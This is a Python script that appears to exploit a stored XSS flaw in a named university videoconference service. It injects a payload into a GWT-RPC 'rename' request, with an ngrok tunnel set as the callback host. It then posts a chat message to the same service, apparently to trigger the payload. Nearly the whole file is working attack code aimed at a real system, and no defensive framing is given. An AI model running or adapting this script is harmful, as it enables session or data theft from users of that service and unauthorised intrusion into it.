import requests
from config import get_xss, TARGET_URL, get_base_headers
from helper import load_json_postData


def rename(CALLBACK_URL):
    postData = load_json_postData()
    postData[11] = get_xss(CALLBACK_URL)
    postData = "|".join(postData)
    print(postData)
    headers = get_base_headers()
    urls = requests.post(url=TARGET_URL, data=postData, headers=headers)
    print(urls.content)


def message():
    headers = get_base_headers()
    postData = "7|0|8|https://e-class.tsu.ru/videoconference/|C17DA4923F3BB99EE03E46E05FE3AE93|com.mind.videoconference.rpc.api.ChatService|sendChatMessage|java.lang.String/2004016611|com.mind.videoconference.dto.id.ConferenceSessionParticipantId/1079013347|test|LI_BEGIN::action=WEB_USER_CHAT_MESSAGE;ConferenceSessionParticipantId=;message=test::LI_END|1|2|3|4|3|5|6|5|7|0|8|"
    urls = requests.post(
        url="https://e-class.tsu.ru/videoconference/service/chat",
        data=postData,
        headers=headers,
    )
    print(urls.content)


if __name__ == "__main__":
    rename(
        "https://d8c6-2001-47c8-4b3f-2b00-7c0e-5a0b-9a7a.ngrok-free.app"
    )
    message()
